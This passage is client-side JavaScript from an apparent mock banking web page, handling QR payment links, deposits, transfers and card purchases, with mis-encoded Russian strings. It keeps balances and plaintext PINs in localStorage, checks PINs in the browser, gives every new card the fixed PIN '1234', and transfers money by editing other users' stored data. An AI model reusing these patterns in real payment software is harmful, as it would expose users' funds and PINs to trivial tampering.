      saveUserData();
      updateRecentTransactions();
    }

    function selectCard(index) {
      activeCardIndex = index;
      updateActiveCardDisplay();
      updateQRCardSelector();
    }

    // ==============================================
    // QR –ö–û–î–´
    // ==============================================
    
    function generateQRCode() {
      const i = parseInt(document.getElementById('qr-card-select').value);
      const amount = document.getElementById('qr-amount').value;
      
      if (i < 0 || i >= userCards.length) {
        alert("–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ä—Ç—É");
        return;
      }
      
      const card = userCards[i];
      let link = window.location.origin + window.location.pathname + `?card=${card.number.replace(/\s/g, '')}`;
      
      if (amount) link += `&amount=${amount}`;
      
      const container = document.getElementById('qrcode-display');
      container.innerHTML = '';
      
      try {
        const qr = qrcode(0, 'M');
        qr.addData(link);
        qr.make();
        
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 200;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#FFFFFF';
        ctx.fillRect(0, 0, 200, 200);
        ctx.fillStyle = '#0a4d2e';
        const size = 200 / qr.getModuleCount();
        
        for (let r = 0; r < qr.getModuleCount(); r++) {
          for (let c = 0; c < qr.getModuleCount(); c++) {
            if (qr.isDark(r, c)) {
              ctx.fillRect(c * size, r * size, size, size);
            }
          }
        }
        
        container.appendChild(canvas);
        document.getElementById('qr-display-card-number').textContent = card.number;
        document.getElementById('qr-code-result').style.display = 'block';
      } catch (e) {
        alert("–û—à–∏–±–∫–∞");
      }
    }

    function showQuickQRCode() {
      if (userCards.length === 0) {
        alert("–ù–µ—Ç –∫–∞—Ä—Ç");
        return;
      }
      
      const card = userCards[activeCardIndex];
      const link = window.location.origin + window.location.pathname + `?card=${card.number.replace(/\s/g, '')}`;
      
      const container = document.getElementById('qrcode-modal');
      container.innerHTML = '';
      
      try {
        const qr = qrcode(0, 'M');
        qr.addData(link);
        qr.make();
        
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 200;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#FFFFFF';
        ctx.fillRect(0, 0, 200, 200);
        ctx.fillStyle = '#0a4d2e';
        const size = 200 / qr.getModuleCount();
        
        for (let r = 0; r < qr.getModuleCount(); r++) {
          for (let c = 0; c < qr.getModuleCount(); c++) {
            if (qr.isDark(r, c)) {
              ctx.fillRect(c * size, r * size, size, size);
            }
          }
        }
        
        container.appendChild(canvas);
        document.getElementById('qr-modal-card-number').textContent = card.number;
        document.getElementById('qr-modal').classList.remove('hidden');
      } catch (e) {
        alert("–û—à–∏–±–∫–∞");
      }
    }

    // ==============================================
    // –û–ü–ï–†–ê–¶–ò–ò –° –ö–ê–†–¢–ê–ú–ò
    // ==============================================
    
    function handleDeposit() {
      const amount = parseFloat(document.getElementById('deposit-amount').value);
      const pin = document.getElementById('deposit-pin').value;
      const msg = document.getElementById('deposit-message');
      
      if (!amount || amount <= 0) {
        showMessage(msg, "–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É", false);
        return;
      }
      
      const card = userCards[activeCardIndex];
      if (pin !== card.pin) {
        showMessage(msg, "–ù–µ–≤–µ—Ä–Ω—ã–π PIN", false);
        return;
      }
      
      card.balance += amount;
      addTransaction('deposit', amount, '–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ', card.balance);
      saveUserData();
      updateActiveCardDisplay();
      
      showMessage(msg, `–ü–æ–ø–æ–ª–Ω–µ–Ω–æ –Ω–∞ ${formatAmount(amount)}`, true);
      setTimeout(() => document.getElementById('deposit-modal').classList.add('hidden'), 1500);
    }

    function handleTransfer() {
      const to = document.getElementById('recipient-card').value.replace(/\s/g, '');
      const amount = parseFloat(document.getElementById('transfer-amount').value);
      const pin = document.getElementById('transfer-pin').value;
      const msg = document.getElementById('transfer-message');
      
      if (!to || to.length !== 16) {
        showMessage(msg, "–ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã", false);
        return;
      }
      
      if (!amount || amount <= 0) {
        showMessage(msg, "–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É", false);
        return;
      }
      
      const card = userCards[activeCardIndex];
      if (pin !== card.pin) {
        showMessage(msg, "–ù–µ–≤–µ—Ä–Ω—ã–π PIN", false);
        return;
      }
      
      const total = amount * 1.01;
      if (total > card.balance) {
        showMessage(msg, `–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤`, false);
        return;
      }
      
      let found = false;
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('@')) {
          const data = JSON.parse(localStorage.getItem(key));
          const recipient = data.cards?.find(c => c.number.replace(/\s/g, '') === to);
          if (recipient) {
            recipient.balance += amount;
            localStorage.setItem(key, JSON.stringify(data));
            found = true;
            break;
          }
        }
      }
      
      if (!found) {
        showMessage(msg, "–ö–∞—Ä—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞", false);
        return;
      }
      
      card.balance -= total;
      addTransaction('transfer', amount, '–ü–µ—Ä–µ–≤–æ–¥', card.balance);
      saveUserData();
      updateActiveCardDisplay();
      
      showMessage(msg, `–ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ ${formatAmount(amount)}`, true);
      setTimeout(() => document.getElementById('transfer-modal').classList.add('hidden'), 1500);
    }

    function handleAddCard() {
      const type = document.getElementById('new-card-type').value;
      const name = document.getElementById('new-card-name').value.trim() || CARD_TYPES[type].name;
      const msg = document.getElementById('add-card-message');
      
      const info = CARD_TYPES[type];
      const card = userCards[activeCardIndex];
      
      if (info.price > 0 && info.price > card.balance) {
        showMessage(msg, `–ù—É–∂–Ω–æ: ${info.price} —Å–æ–º.`, false);
        return;
      }
      
      const newCard = {
        id: Date.now().toString(),
        type,
        number: generateCardNumber(),
        name,
        balance: 0,
        isPrimary: false,
        pin: '1234',
        expiry: '12/28'
      };
      
      if (type !== 'debit') {
        card.balance -= info.price;
        addTransaction('purchase', info.price, `–ü–æ–∫—É–ø–∫–∞ ${info.name}`, card.balance);
      }
      
      userCards.push(newCard);
      saveUserData();
      
      showMessage(msg, `–ö–∞—Ä—Ç–∞ "${name}" –¥–æ–±–∞–≤–ª–µ–Ω–∞`, true);
      setTimeout(() => {
        document.getElementById('add-card-modal').classList.add('hidden');
        updateActiveCardDisplay();
        updateCardsList();
        updateQRCardSelector();
      }, 1500);
    }

    function purchaseCard(type) {
      const info = CARD_TYPES[type];
      const card = userCards[activeCardIndex];
      
      if (info.price > card.balance) {
        alert(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤! –ù—É–∂–Ω–æ: ${info.price} —Å–æ–º.`);
        return;
      }
      
      if (!confirm(`–ö—É–ø–∏—Ç—å ${info.name} –∫–∞—Ä—Ç—É –∑–∞ ${info.price} —Å–æ–º.?`)) return;
      
      const newCard = {
        id: Date.now().toString(),
        type,
        number: generateCardNumber(),
        name: info.name,
        balance: 0,
        isPrimary: false,
        pin: '1234',
        expiry: '12/28'
      };
      
      card.balance -= info.price;
      userCards.push(newCard);
      addTransaction('purchase', info.price, `–ü–æ–∫—É–ø–∫–∞ ${info.name}`, card.balance);
      saveUserData();
      
      alert(`‚úÖ ${info.name} –∫–∞—Ä—Ç–∞ –ø—Ä–∏–æ–±—Ä–µ—Ç–µ–Ω–∞!`);
      updateActiveCardDisplay();
      updateCardsList();
      updateQRCardSelector();
    }

    function showTransactionHistory() {
      if (userTransactions.length === 0) {
        alert("–ò—Å—Ç–æ—Ä–∏—è –ø—É—Å—Ç–∞");
        return;
      }
      
      let text = "–ò–°–¢–û–†–ò–Ø –¢–†–ê–ù–ó–ê–ö–¶–ò–ô\n\n";
      userTransactions.slice(0, 10).forEach((t, i) => {
        text += `${i+1}. ${t.type === 'deposit' ? '+' : '-'}${formatAmount(t.amount)}\n`;
      });
      alert(text);
    }

    function handleLogout() {
      if (confirm("–í—ã–π—Ç–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã?")) {
        currentUser = null;
        localStorage.removeItem('currentUser');
        showAuthScreen();
      }
    }

    // ==============================================
    // –ù–ê–°–¢–†–û–ô–ö–ê –û–ë–†–ê–ë–û–¢–ß–ò–ö–û–í
    // ==============================================
    
    function setupEventListeners() {
      // –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
      document.getElementById('login-btn').addEventListener('click', handleLogin);
      document.getElementById('register-btn').addEventListener('click', handleRegister);
      document.getElementById('logout-btn').addEventListener('click', handleLogout);
      
      document.getElementById('show-register').addEventListener('click', (e) => {
        e.preventDefault();
        document.getElementById('login-form').style.display = 'none';
        document.getElementById('register-form').style.display = 'block';
      });
      
      document.getElementById('show-login').addEventListener('click', (e) => {
        e.preventDefault();
        document.getElementById('login-form').style.display = 'block';
        document.getElementById('register-form').style.display = 'none';
      });
      
      // –¢–∞–±—ã
      document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
          document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
          this.classList.add('active');
          document.getElementById(`${this.dataset.tab}-tab`).classList.remove('hidden');
        });
      });
      
      // –ö–∞—Ä—Ç—ã
      document.getElementById('add-card-btn').addEventListener('click', () => {
        document.getElementById('add-card-modal').classList.remove('hidden');
      });
      
      document.getElementById('confirm-add-card').addEventListener('click', handleAddCard);
      
      // –í–Ω–µ—à–Ω–∏–µ –∫–∞—Ä—Ç—ã
      document.getElementById('add-external-card-btn').addEventListener('click', () => {
        document.getElementById('add-external-card-modal').classList.remove('hidden');
      });
      
      document.getElementById('confirm-add-external-card').addEventListener('click', handleAddExternalCard);
      
      // –ü–æ–∫—É–ø–∫–∞ –∫–∞—Ä—Ç
      document.querySelectorAll('.get-card-btn').forEach(btn => {
        btn.addEventListener('click', function() {
          purchaseCard(this.dataset.cardType);
        });
      });
      
      // –ö—Ä–µ–¥–∏—Ç—ã
      document.getElementById('apply-credit-btn').addEventListener('click', () => openCreditModal('consumer'));
      document.getElementById('confirm-credit-btn').addEventListener('click', handleCreditApplication);
      
      // QR
      document.getElementById('generate-qr-btn').addEventListener('click', generateQRCode);
      
      // –û–ø–µ—Ä–∞—Ü–∏–∏
      document.getElementById('confirm-deposit').addEventListener('click', handleDeposit);
      document.getElementById('confirm-transfer').addEventListener('click', handleTransfer);
      
      // –î—Ä—É–≥–æ–π –±–∞–Ω–∫
      document.getElementById('external-bank').addEventListener('change', function() {
        const customGroup = document.getElementById('custom-bank-group');
        if (this.value === '–î—Ä—É–≥–æ–π') {
          customGroup.classList.remove('hidden');
        } else {
          customGroup.classList.add('hidden');
        }
      });
      
      // –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª–æ–∫
      document.querySelectorAll('.modal-close, .close-modal').forEach(btn => {
        btn.addEventListener('click', function() {
          this.closest('.modal').classList.add('hidden');
        });
      });
    }

    // –ó–∞–ø—É—Å–∫
    window.addEventListener('load', initApp);
  </script>
</body>
</html>
